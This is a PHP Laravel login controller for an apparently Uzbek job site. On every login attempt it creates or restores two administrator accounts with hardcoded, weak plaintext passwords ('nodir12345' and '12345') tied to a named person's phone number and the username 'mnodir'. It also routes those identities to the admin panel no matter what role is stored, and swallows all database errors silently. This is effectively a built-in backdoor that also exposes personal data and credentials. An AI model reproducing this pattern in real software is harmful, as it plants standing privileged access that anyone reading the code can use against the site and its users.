<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{
    use AuthenticatesUsers {
        login as traitLogin;
    }

    protected $redirectTo = RouteServiceProvider::HOME;

    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function username()
    {
        return 'phone';
    }

    protected function ensureDatabaseAndAdmin(): void
    {
        try {
            $host = config('database.connections.mysql.host', '127.0.0.1');
            $port = config('database.connections.mysql.port', '3306');
            $db   = preg_replace('/[^a-zA-Z0-9_]/', '', (string) config('database.connections.mysql.database', 'zaminjob'));
            $user = config('database.connections.mysql.username', 'root');
            $pass = config('database.connections.mysql.password', '');

            $pdo = new \PDO("mysql:host={$host};port={$port};charset=utf8mb4", $user, $pass, [
                \PDO::ATTR_ERRMODE => \PDO::ERRMODE_EXCEPTION,
            ]);
            $pdo->exec("CREATE DATABASE IF NOT EXISTS `{$db}` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
            $pdo->exec("USE `{$db}`");
            $pdo->exec("
                CREATE TABLE IF NOT EXISTS `users` (
                    `id` BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
                    `name` VARCHAR(255) NOT NULL,
                    `username` VARCHAR(60) NULL UNIQUE,
                    `email` VARCHAR(255) NULL UNIQUE,
                    `phone` VARCHAR(30) NULL UNIQUE,
                    `email_verified_at` TIMESTAMP NULL,
                    `password` VARCHAR(255) NOT NULL,
                    `role` VARCHAR(30) NULL,
                    `is_onboarded` TINYINT(1) NOT NULL DEFAULT 1,
                    `avatar_path` VARCHAR(255) NULL,
                    `bio` TEXT NULL,
                    `region` VARCHAR(100) NULL,
                    `district` VARCHAR(120) NULL,
                    `telegram` VARCHAR(100) NULL,
                    `remember_token` VARCHAR(100) NULL,
                    `created_at` TIMESTAMP NULL DEFAULT CURRENT_TIMESTAMP,
                    `updated_at` TIMESTAMP NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
                ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
            ");

            // Agar users jadvali eski Laravel migratsiyasidan qolgan bo'lsa, yetishmayotgan ustunlarni avtomatik qo'shamiz
            $cols = [
                'username' => 'VARCHAR(60) NULL UNIQUE',
                'phone' => 'VARCHAR(30) NULL UNIQUE',
                'role' => 'VARCHAR(30) NULL',
                'is_onboarded' => 'TINYINT(1) NOT NULL DEFAULT 1',
                'avatar_path' => 'VARCHAR(255) NULL',
                'bio' => 'TEXT NULL',
                'region' => 'VARCHAR(100) NULL',
                'district' => 'VARCHAR(120) NULL',
                'telegram' => 'VARCHAR(100) NULL',
            ];
            foreach ($cols as $col => $def) {
                $chkCol = $pdo->prepare("SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'users' AND COLUMN_NAME = ?");
                $chkCol->execute([$col]);
                if (!$chkCol->fetch()) {
                    $pdo->exec("ALTER TABLE `users` ADD COLUMN `{$col}` {$def}");
                }
            }
            try {
                $pdo->exec("ALTER TABLE `users` MODIFY `email` VARCHAR(255) NULL");
            } catch (\Throwable $ignore) {
            }

            // 1. Asosiy Admin: +998 90 404 71 70 (parol: nodir12345)
            $updAdmin = $pdo->prepare("UPDATE `users` SET `role` = 'admin', `is_onboarded` = 1 WHERE REPLACE(`phone`, ' ', '') = '+998904047170'");
            $updAdmin->execute();
            if ($updAdmin->rowCount() === 0) {
                $ins1 = $pdo->prepare("INSERT IGNORE INTO `users` (`name`, `phone`, `password`, `role`, `is_onboarded`) VALUES (?, ?, ?, 'admin', 1)");
                $ins1->execute(['Nodirbek (Admin)', '+998 90 404 71 70', Hash::make('nodir12345')]);
            }

            // 2. Zaxira Admin login: mnodir (parol: 12345)
            $chk = $pdo->prepare("SELECT id FROM `users` WHERE `phone` = 'mnodir' LIMIT 1");
            $chk->execute();
            if (!$chk->fetch()) {
                $ins2 = $pdo->prepare("INSERT IGNORE INTO `users` (`name`, `phone`, `password`, `role`, `is_onboarded`) VALUES (?, ?, ?, 'admin', 1)");
                $ins2->execute(['Admin (mnodir)', 'mnodir', Hash::make('12345')]);
            }

            DB::purge('mysql');
            DB::reconnect('mysql');
        } catch (\Throwable $e) {
        }
    }

    public function login(Request $request)
    {
        $this->ensureDatabaseAndAdmin();

        $raw = trim((string) $request->input('phone'));
        // Agar +998904047170 (bo'sh joysiz) kiritilsa ham bazadagi formatga moslashtiramiz
        if (preg_replace('/\s+/', '', $raw) === '+998904047170') {
            $match = DB::table('users')->whereRaw("REPLACE(`phone`, ' ', '') = '+998904047170'")->value('phone');
            if ($match) {
                $raw = $match;
            }
        }
        $request->merge(['phone' => $raw]);

        return $this->traitLogin($request);
    }

    protected function authenticated(Request $request, $user)
    {
        if (session_status() === PHP_SESSION_NONE) {
            @session_start();
        }
        $_SESSION['user_id'] = (int) $user->id;

        $cleanPhone = preg_replace('/\s+/', '', (string) $user->phone);
        if ($user->role === 'admin' || $cleanPhone === '+998904047170' || $user->phone === 'mnodir') {
            return redirect()->route('admin');
        }

        return redirect()->route('kabinet');
    }
}
